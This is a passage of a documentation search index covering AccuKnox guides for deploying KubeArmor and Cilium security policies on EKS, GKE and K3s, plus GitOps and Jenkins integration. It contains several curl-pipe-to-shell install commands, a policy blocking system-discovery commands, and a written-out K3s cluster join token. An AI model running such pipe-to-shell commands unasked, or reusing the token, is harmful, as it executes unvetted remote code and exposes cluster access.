Kuberarmor and Cilium on EKS Ubuntu Server 20.04 by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/eks/eks/#step-1-create-a-eks-cluster","text":"Install EKS CTL , AWS CLI , Helm tools cat eks-config.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : eks-ubuntu-cluster region : us-east-2 nodeGroups : - name : ng-1 instanceType : c5a.xlarge amiFamily : \"Ubuntu2004\" desiredCapacity : 1 volumeSize : 80 ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" Official Link: Sample eks-config.yaml Note: EKS suported image types: Amazon Linux 2 Ubuntu 20.04 Ubuntu 18.04 Bottlerocket Windows Server 2019 Core Container Windows Server 2019 Full Container Windows Server 2004 Core Container Windows Server 20H2 Core Container eksctl create cluster -f eks-config.yaml aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster","title":"Step 1: Create a EKS Cluster"},{"location":"open-source/eks/eks/#step-2-karmor-install","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor version karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor","title":"Step 2: Karmor Install"},{"location":"open-source/eks/eks/#step-3-cilium-install","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble","title":"Step 3: Cilium Install"},{"location":"open-source/eks/eks/#step-4-kubearmor-policy","text":"1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block 3. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched lables. Ex: (app: nginx) 4. Policy violation kubectl exec -it nginx-766b69bd4b-8jttd -- bash 5. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 6. Verifying policy Violation logs karmor log","title":"Step 4: Kubearmor Policy"},{"location":"open-source/eks/eks/#step-5-cilium-policy","text":"1. Create a tightfighter and deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Explore the policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml 4. Policy violation kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/bye 5. Cilium SVC port forward to Monitor the logs cilium hubble port-forward 6. Monitoring the Cilium Violation logs hubble observe -f --protocol http --pod tiefighter","title":"Step 5: Cilium Policy"},{"location":"open-source/gitops/AWS-user-credential-and-Jenkins-Integration/","text":"As a prerequisites, It is required to create IAM user in AWS to generate access key and secret access key. Creating an IAM user in your AWS account To integrate with Jenkins credentials \u00b6 Open Jenkins Server Go to Dashboard Manage Jenkins Manage Credentials Choose global configuration and Add Credentials Choose secret text as kind and fill the access key with desire ID that is used in apply.yaml. Similarly, repeat the same for secret access key.","title":"AWS user credential and Jenkins Integration"},{"location":"open-source/gitops/AWS-user-credential-and-Jenkins-Integration/#to-integrate-with-jenkins-credentials","text":"Open Jenkins Server Go to Dashboard Manage Jenkins Manage Credentials Choose global configuration and Add Credentials Choose secret text as kind and fill the access key with desire ID that is used in apply.yaml. Similarly, repeat the same for secret access key.","title":"To integrate with Jenkins credentials"},{"location":"open-source/gitops/GCP-Service-Account-and-Jenkins-Integration/","text":"As a prerequisites, It is required to have GCP service account and its key. Creating and managing service accounts Creating and managing service account keys To integrate with Jenkins credentials \u00b6 Open Jenkins Server Go to Dashboard Manage Jenkins Manage Credentials Choose global configuration and Add Credentials Choose Secret file as kind and provide the ID that is used in apply.yaml","title":"GCP Service Account and Jenkins Integration"},{"location":"open-source/gitops/GCP-Service-Account-and-Jenkins-Integration/#to-integrate-with-jenkins-credentials","text":"Open Jenkins Server Go to Dashboard Manage Jenkins Manage Credentials Choose global configuration and Add Credentials Choose Secret file as kind and provide the ID that is used in apply.yaml","title":"To integrate with Jenkins credentials"},{"location":"open-source/gitops/gitops/","text":"GitOps Workflow for Policy Template \u00b6 Objective \u00b6 The main goal is to setup end to end GitOps workflow with few steps for applying policies on instances in an automated way. The policies that are promoted here are from the open source kubearmor's policy-template repository. To know more about policty tempates. Visit the official site Step 1: Generate Script \u00b6 What is the policy-template CLI? Policy-template is a command-line utility that lets the user generate the necessary policies and provides the automation scripts in order to set up a pipeline in Jenkins. Download policy-template CLI utility Run the following command to download the policy-template GitOps CLI utility. sudo curl -o policy-template https://storage.googleapis.com/policy-gitops/latest/policy-template && sudo chmod a+x policy-template | sudo mv policy-template /usr/bin Generate policy-template Run the below command to generate desire policy template. sudo policy-template generate <template-name> Example The below command generates a policy template with the directory name sample . sudo policy-template generate sample GKE EKS apply.yaml gke : projectId : \"\" cluster : name : \"\" location : \"\" auth : serviceAccountId : \"\" delete : false | true Attribute Description gke.projectId GCP project id gke.cluster.name GKE cluster name gke.cluster.location GKE cluster location gke.auth.serviceAccountId Jenkins credential Id in which the GCP service account key is stored as a secret file delete Applied polices on instance gets deleted if it is true To setup service account id in Jenkins credential apply.yaml eks : cluster : name : \"\" location : \"\" auth : accessKeyId : \"\" secretAccessKey : \"\" delete : true | false Attribute Description eks.cluster.name EKS cluster name gke.cluster.location EKS cluster location eks.auth.accessKeyId AWS access key jenkins credential ID eks.auth.secretAccessKey AWS secret access key jenkins credential ID delete Applied polices on instance gets deleted if it is true To setup access key and secret access key in Jenkins credential Jenkinsfile with automation script is auto generated and reads the value provided in the apply.yaml To update the exsisting template The below command will let the user to add or update the policies in the existing template. sudo policy-template update <template-name> Example sudo policy-template update sample To delete the applied policies The below command will let the user to delete the policies in the existing template by Jenkins pipeline, once it is pushed to the remote SCM. sudo policy-template delete <template-name> Example sudo policy-template delete sample Once it is pushed to SCM, Jenkins will delete the policies. Step 2: Push to remote SCM \u00b6 Run the below command to initiate and push the changes to GitHub. sudo policy-template init github Github Step 3: Integrate with Automation tool \u00b6 Below steps are the instruction to create a pipelien in Jenkins Create an item as a multi-branch pipeline and provide the job name. Integrate the remote SCM in it. The branch with the Jenkinsfile in the template appears in the job list. Click Build Now or Configure webhook for auto-trigger. This applies the policies on the configured instance in apply.yaml file.","title":"GitOps Workflow for Policy Template"},{"location":"open-source/gitops/gitops/#gitops-workflow-for-policy-template","text":"","title":"GitOps Workflow for Policy Template"},{"location":"open-source/gitops/gitops/#objective","text":"The main goal is to setup end to end GitOps workflow with few steps for applying policies on instances in an automated way. The policies that are promoted here are from the open source kubearmor's policy-template repository. To know more about policty tempates. Visit the official site","title":"Objective"},{"location":"open-source/gitops/gitops/#step-1-generate-script","text":"What is the policy-template CLI? Policy-template is a command-line utility that lets the user generate the necessary policies and provides the automation scripts in order to set up a pipeline in Jenkins. Download policy-template CLI utility Run the following command to download the policy-template GitOps CLI utility. sudo curl -o policy-template https://storage.googleapis.com/policy-gitops/latest/policy-template && sudo chmod a+x policy-template | sudo mv policy-template /usr/bin Generate policy-template Run the below command to generate desire policy template. sudo policy-template generate <template-name> Example The below command generates a policy template with the directory name sample . sudo policy-template generate sample GKE EKS apply.yaml gke : projectId : \"\" cluster : name : \"\" location : \"\" auth : serviceAccountId : \"\" delete : false | true Attribute Description gke.projectId GCP project id gke.cluster.name GKE cluster name gke.cluster.location GKE cluster location gke.auth.serviceAccountId Jenkins credential Id in which the GCP service account key is stored as a secret file delete Applied polices on instance gets deleted if it is true To setup service account id in Jenkins credential apply.yaml eks : cluster : name : \"\" location : \"\" auth : accessKeyId : \"\" secretAccessKey : \"\" delete : true | false Attribute Description eks.cluster.name EKS cluster name gke.cluster.location EKS cluster location eks.auth.accessKeyId AWS access key jenkins credential ID eks.auth.secretAccessKey AWS secret access key jenkins credential ID delete Applied polices on instance gets deleted if it is true To setup access key and secret access key in Jenkins credential Jenkinsfile with automation script is auto generated and reads the value provided in the apply.yaml To update the exsisting template The below command will let the user to add or update the policies in the existing template. sudo policy-template update <template-name> Example sudo policy-template update sample To delete the applied policies The below command will let the user to delete the policies in the existing template by Jenkins pipeline, once it is pushed to the remote SCM. sudo policy-template delete <template-name> Example sudo policy-template delete sample Once it is pushed to SCM, Jenkins will delete the policies.","title":"Step 1: Generate Script"},{"location":"open-source/gitops/gitops/#step-2-push-to-remote-scm","text":"Run the below command to initiate and push the changes to GitHub. sudo policy-template init github Github","title":"Step 2: Push to remote SCM"},{"location":"open-source/gitops/gitops/#step-3-integrate-with-automation-tool","text":"Below steps are the instruction to create a pipelien in Jenkins Create an item as a multi-branch pipeline and provide the job name. Integrate the remote SCM in it. The branch with the Jenkinsfile in the template appears in the job list. Click Build Now or Configure webhook for auto-trigger. This applies the policies on the configured instance in apply.yaml file.","title":"Step 3: Integrate with Automation tool"},{"location":"open-source/gke-cos/cos/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on GKE with COS and Ubuntu by applying policies on kubernetes workloads. Step 1: Install Daemonsets & Services \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash Note: This will Install all the components. Step 2: Verify the Installation \u00b6 Kubectl get pods -A Step 3: Install sample K8's Application \u00b6 kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Step 4: Verify the Installation \u00b6 kubectl get pods -n wordpress-mysql Step 5: Get Auto discovered policies \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash Step 6: Applying Auto discovered policies on Cluster \u00b6 These policies can then be applied on the k8s cluster running KubeArmor and Cilium . Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network. Apply Kubearmor policy: kubectl apply -f kubearmor_policies_default_wordpress-mysql_wordpress_divgfyof.yaml Apply Cilium policy: kubectl apply -f cilium_policies.yaml To list applied policies, kubectl get ksp,cnp -A To uninstall all the services Installed: curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Cos"},{"location":"open-source/gke-cos/cos/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on GKE with COS and Ubuntu by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/gke-cos/cos/#step-1-install-daemonsets-services","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash Note: This will Install all the components.","title":"Step 1: Install Daemonsets &amp; Services"},{"location":"open-source/gke-cos/cos/#step-2-verify-the-installation","text":"Kubectl get pods -A","title":"Step 2: Verify the Installation"},{"location":"open-source/gke-cos/cos/#step-3-install-sample-k8s-application","text":"kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Step 3: Install sample K8's Application"},{"location":"open-source/gke-cos/cos/#step-4-verify-the-installation","text":"kubectl get pods -n wordpress-mysql","title":"Step 4: Verify the Installation"},{"location":"open-source/gke-cos/cos/#step-5-get-auto-discovered-policies","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash","title":"Step 5: Get Auto discovered policies"},{"location":"open-source/gke-cos/cos/#step-6-applying-auto-discovered-policies-on-cluster","text":"These policies can then be applied on the k8s cluster running KubeArmor and Cilium . Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network. Apply Kubearmor policy: kubectl apply -f kubearmor_policies_default_wordpress-mysql_wordpress_divgfyof.yaml Apply Cilium policy: kubectl apply -f cilium_policies.yaml To list applied policies, kubectl get ksp,cnp -A To uninstall all the services Installed: curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Step 6: Applying Auto discovered policies on Cluster"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/","text":"Jenkins Plugin: AccuKnox Policy Tool \u00b6 Allows you to apply or push AccuKnox Auto-discovered and Policy-Template policies to the Kubernetes cluster or GitHub repository of your choosing. // Example when used in a pipeline node { stage('AccuKnox Policy push to GitHub') { steps { KnoxAutoPol(useAutoApply: false, pushToGit: true, gitBaseBranchName: deploy-demo ,gitBranchName: demobranch, gitToken: gh_demotoken, gitRepoUrl: https://github.com/demouser/demorepo.git, gitUserName: demouser ) } } } \ud83d\udcdd Source code can be found on accuknox/jenkins-integration Prerequisites \u00b6 A Jenkins installation running version 2.164.1or higher (with jdk8 or jdk11). A node with Kubectl configured A Kubernetes cluster. [ Optional ] A GitHub token with read/write permission A GitHub repository to update the policies How it works \u00b6 Once the build starts, the plugin generates a set of AccuKnox policies [ consisting of KubeArmor and Cilium Policies ]. The policy files are stored in /tmp/accuknox-client-repo/<repo-name> and will be deleted once the GitHub push is completed. The plugin also creates temporary files under $USER/$CURRENT_DIR . The plugin makes use of 3 modules Auto-Discover: This module helps the auto-discovery of AccuKnox policies based on the workloads that are present in the current Kubernetes cluster. This module makes use of auto-discovery scripts outline in AccuKnox help section . Install Daemonsets and Services Get Auto Discovered Policies The output is stored into a new folder ad-policy under the current working directory and is transferred to the GitHub repo under /tmp/accuknox-client-repo/<repo_name> Policy-Templates: This module is responsible for downloading the latest updates from the policy-template repository and shortlisting policies that are relevant to the workloads that are present in the current Kubernetes cluster. This module also automatically replaces the name, namespace, and label field with that of the current Kubernetes cluster so that the policies are enforceable. Git-Operations: The git operation module ensures that the updated policies are pushed to a new branch and creates and merges a PR to the CD-enabled branch of the users choosing. Quick Usage Guide \u00b6 Parameters \u00b6 Name Mandatory Description 1 gitBaseBranchName yes The GitHub base branch name to which PR needs to be created and merged 2 gitBranchName yes The GitHub branch name to which new updates are to be pushed 3 gitToken yes GitHub token with read/write permission 4 gitRepoUrl yes GitHub base repository URL for cloning and updating the values. eg: https://github.com/owner_info/repo_name.git 5 gitUserName yes GitHub username/organization name to which the repository belongs. 6 useAutoApply no Boolean flag. Turn on to apply the generated policies to the cluster directly. 7 pushToGit yes Boolean flag. Checking this flag is required if the policies need to be updated to the GitHub repository Using the Plugin in a Pipeline \u00b6 The AccuKnox-CLI plugin provides the function KnoxAutoPol() for Jenkins Pipeline support. You can go to the Snippet Generator page under the Pipeline Syntax section in Jenkins, select KnoxAutoPol: Setup AccuKnox CLI from the Sample Step dropdown, and it will provide you configuration interface for the plugin. After filling the entries and clicking Generate Pipeline Script button, you will get the sample scripts that can be used in your Pipeline definition. Example: node { stage('AccuKnox Policy push to GitHub') { steps { KnoxAutoPol(useAutoApply: false, pushToGit: true, gitBaseBranchName: deploy-demo, gitBranchName: demobranch, gitToken: gh_demotoken, gitRepoUrl: https://github.com/demouser/demorepo.git, gitUserName: demouser ) } } } Using the Plugin from the Web Interface \u00b6 Within the Jenkins dashboard, select a Job and then select \"Configure\" Scroll down to the \"Build\" section Select \"AccuKnox CLI\" In the checkbox, select which is applicable (eg. Push to GitHub ) Open the Advanced tab Fill in the necessary details like GitHub username, token, etc Save Development \u00b6 Building and testing \u00b6 Clone the GitHub repository git clone git@github.com:accuknox/jenkins-integration.git Change directory to jenkins-integration cd jenkins-integration To build the extension, run: mvn clean package and upload target/knoxautopol.hpi to your Jenkins installation. To run the tests: mvn clean test Performing a Release \u00b6 mvn release:prepare release:perform For a complete guide on how to configure and use the plugin please refer to our blog Jenkins Integration with AccuKnox Policy Tool Plugin .","title":"Jenkins Plugin Integration"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#jenkins-plugin-accuknox-policy-tool","text":"Allows you to apply or push AccuKnox Auto-discovered and Policy-Template policies to the Kubernetes cluster or GitHub repository of your choosing. // Example when used in a pipeline node { stage('AccuKnox Policy push to GitHub') { steps { KnoxAutoPol(useAutoApply: false, pushToGit: true, gitBaseBranchName: deploy-demo ,gitBranchName: demobranch, gitToken: gh_demotoken, gitRepoUrl: https://github.com/demouser/demorepo.git, gitUserName: demouser ) } } } \ud83d\udcdd Source code can be found on accuknox/jenkins-integration","title":"Jenkins Plugin: AccuKnox Policy Tool"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#prerequisites","text":"A Jenkins installation running version 2.164.1or higher (with jdk8 or jdk11). A node with Kubectl configured A Kubernetes cluster. [ Optional ] A GitHub token with read/write permission A GitHub repository to update the policies","title":"Prerequisites"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#how-it-works","text":"Once the build starts, the plugin generates a set of AccuKnox policies [ consisting of KubeArmor and Cilium Policies ]. The policy files are stored in /tmp/accuknox-client-repo/<repo-name> and will be deleted once the GitHub push is completed. The plugin also creates temporary files under $USER/$CURRENT_DIR . The plugin makes use of 3 modules Auto-Discover: This module helps the auto-discovery of AccuKnox policies based on the workloads that are present in the current Kubernetes cluster. This module makes use of auto-discovery scripts outline in AccuKnox help section . Install Daemonsets and Services Get Auto Discovered Policies The output is stored into a new folder ad-policy under the current working directory and is transferred to the GitHub repo under /tmp/accuknox-client-repo/<repo_name> Policy-Templates: This module is responsible for downloading the latest updates from the policy-template repository and shortlisting policies that are relevant to the workloads that are present in the current Kubernetes cluster. This module also automatically replaces the name, namespace, and label field with that of the current Kubernetes cluster so that the policies are enforceable. Git-Operations: The git operation module ensures that the updated policies are pushed to a new branch and creates and merges a PR to the CD-enabled branch of the users choosing.","title":"How it works"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#quick-usage-guide","text":"","title":"Quick Usage Guide"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#parameters","text":"Name Mandatory Description 1 gitBaseBranchName yes The GitHub base branch name to which PR needs to be created and merged 2 gitBranchName yes The GitHub branch name to which new updates are to be pushed 3 gitToken yes GitHub token with read/write permission 4 gitRepoUrl yes GitHub base repository URL for cloning and updating the values. eg: https://github.com/owner_info/repo_name.git 5 gitUserName yes GitHub username/organization name to which the repository belongs. 6 useAutoApply no Boolean flag. Turn on to apply the generated policies to the cluster directly. 7 pushToGit yes Boolean flag. Checking this flag is required if the policies need to be updated to the GitHub repository","title":"Parameters"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#using-the-plugin-in-a-pipeline","text":"The AccuKnox-CLI plugin provides the function KnoxAutoPol() for Jenkins Pipeline support. You can go to the Snippet Generator page under the Pipeline Syntax section in Jenkins, select KnoxAutoPol: Setup AccuKnox CLI from the Sample Step dropdown, and it will provide you configuration interface for the plugin. After filling the entries and clicking Generate Pipeline Script button, you will get the sample scripts that can be used in your Pipeline definition. Example: node { stage('AccuKnox Policy push to GitHub') { steps { KnoxAutoPol(useAutoApply: false, pushToGit: true, gitBaseBranchName: deploy-demo, gitBranchName: demobranch, gitToken: gh_demotoken, gitRepoUrl: https://github.com/demouser/demorepo.git, gitUserName: demouser ) } } }","title":"Using the Plugin in a Pipeline"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#using-the-plugin-from-the-web-interface","text":"Within the Jenkins dashboard, select a Job and then select \"Configure\" Scroll down to the \"Build\" section Select \"AccuKnox CLI\" In the checkbox, select which is applicable (eg. Push to GitHub ) Open the Advanced tab Fill in the necessary details like GitHub username, token, etc Save","title":"Using the Plugin from the Web Interface"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#development","text":"","title":"Development"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#building-and-testing","text":"Clone the GitHub repository git clone git@github.com:accuknox/jenkins-integration.git Change directory to jenkins-integration cd jenkins-integration To build the extension, run: mvn clean package and upload target/knoxautopol.hpi to your Jenkins installation. To run the tests: mvn clean test","title":"Building and testing"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#performing-a-release","text":"mvn release:prepare release:perform For a complete guide on how to configure and use the plugin please refer to our blog Jenkins Integration with AccuKnox Policy Tool Plugin .","title":"Performing a Release"},{"location":"open-source/k3s/k3s/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on K3's by applying policies on kubernetes workloads. Step 1: Install Virtualbox \u00b6 sudo apt-get install virtualbox -y Step 2: Install Vagrant \u00b6 wget https://releases.hashicorp.com/vagrant/2.2.14/vagrant_2.2.14_x86_64.deb sudo apt install ./vagrant_2.2.14_x86_64.deb vagrant \u2013version vagrant plugin install vagrant-scp vagrant plugin list Step 3: Configure Ubuntu on Vagrant Virtualbox \u00b6 nano VagrantFile # -*- mode: ruby -*- # vi: set ft=ruby : ENV['VAGRANT_NO_PARALLEL'] = 'yes' Vagrant.configure(2) do |config| NodeCount = 2 (1..NodeCount).each do |i| config.vm.define \"ubuntuvm#{i}\" do |node| node.vm.box = \"generic/ubuntu2004\" node.vm.box_check_update = false node.vm.box_version = \"3.3.0\" node.vm.hostname = \"ubuntuvm#{i}.example.com\" node.vm.network \"private_network\", ip : \"192.168.56.4#{i}\" node.vm.provider \"virtualbox\" do |v| v.name = \"ubuntuvm#{i}\" v.memory = 1024 v.cpus = 1 end end end end vagrant up vagrant ssh ubuntu1 Step 4: Install K3's on Ubuntuvm \u00b6 vagrant ssh ubuntuvm1 curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = \"--node-ip=192.168.56.41 --flannel-iface=eth1\" sh -s - --write-kubeconfig-mode 644 Note: node-ip=192.168.56.41 \u2192 ubuntuvm1 ip systemctl status k3s which kubectl kubectl get nodes cat /var/lib/rancher/k3s/server/token exit vagrant scp ubuntuvm1:/etc/rancher/k3s/k3s.yaml ~/.kube/config nano ~/.kube/config Change the Server: 127.0.0.1 to 192.168.56.41 kubectl get nodes Login in to Ubuntuvm2 vagrant ssh ubuntuvm2 ip a show curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = \"--node-ip=192.168.56.42 --flannel-iface=eth1\" K3S_URL = \"https://192.168.56.41:6443\" K3S_TOKEN = \"K107b9ecf5076c2a0c79760aa0e545d7464f11bbd27c643b1f1b8eef34758af1b89::server:985d51052287fd7554e989bd742c7f31\" sh - Note: IP & Token may change exit kubectl get nodes Step 5: Karmor Install \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor Step 6: Cilium Install \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Step 7: Kubearmor Policy \u00b6 1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Apply the following policy nano nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block 3. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml kubectl get ksp Note: Policy will work based on matched lables Ex: (app: nginx) 4. Violating the policy kubectl exec -it nginx-766b69bd4b-8jttd -- bash Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 Verifying policy Violation logs karmor log Step 8: Cilium Policy \u00b6 1. Create a tightfighter & deathstart deployment nano tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Apply the following policy nano sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get cnp 4. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/bye Cilium SVC port forward to Monitor the logs cilium hubble port-forward Step 9: Install the Hubble CLI Client \u00b6 exportHUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 10: Monitoring the Cilium voilation logs \u00b6 hubble observe -f --protocol http --pod tiefighter","title":"K3s"},{"location":"open-source/k3s/k3s/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on K3's by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/k3s/k3s/#step-1-install-virtualbox","text":"sudo apt-get install virtualbox -y","title":"Step 1: Install Virtualbox"},{"location":"open-source/k3s/k3s/#step-2-install-vagrant","text":"wget https://releases.hashicorp.com/vagrant/2.2.14/vagrant_2.2.14_x86_64.deb sudo apt install ./vagrant_2.2.14_x86_64.deb vagrant \u2013version vagrant plugin install vagrant-scp vagrant plugin list","title":"Step 2: Install Vagrant"},{"location":"open-source/k3s/k3s/#step-3-configure-ubuntu-on-vagrant-virtualbox","text":"nano VagrantFile # -*- mode: ruby -*- # vi: set ft=ruby : ENV['VAGRANT_NO_PARALLEL'] = 'yes' Vagrant.configure(2) do |config| NodeCount = 2 (1..NodeCount).each do |i| config.vm.define \"ubuntuvm#{i}\" do |node| node.vm.box = \"generic/ubuntu2004\" node.vm.box_check_update = false node.vm.box_version = \"3.3.0\" node.vm.hostname = \"ubuntuvm#{i}.example.com\" node.vm.network \"private_network\", ip : \"192.168.56.4#{i}\" node.vm.provider \"virtualbox\" do |v| v.name = \"ubuntuvm#{i}\" v.memory = 1024 v.cpus = 1 end end end end vagrant up vagrant ssh ubuntu1","title":"Step 3: Configure Ubuntu on Vagrant Virtualbox"},{"location":"open-source/k3s/k3s/#step-4-install-k3s-on-ubuntuvm","text":"vagrant ssh ubuntuvm1 curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = \"--node-ip=192.168.56.41 --flannel-iface=eth1\" sh -s - --write-kubeconfig-mode 644 Note: node-ip=192.168.56.41 \u2192 ubuntuvm1 ip systemctl status k3s which kubectl kubectl get nodes cat /var/lib/rancher/k3s/server/token exit vagrant scp ubuntuvm1:/etc/rancher/k3s/k3s.yaml 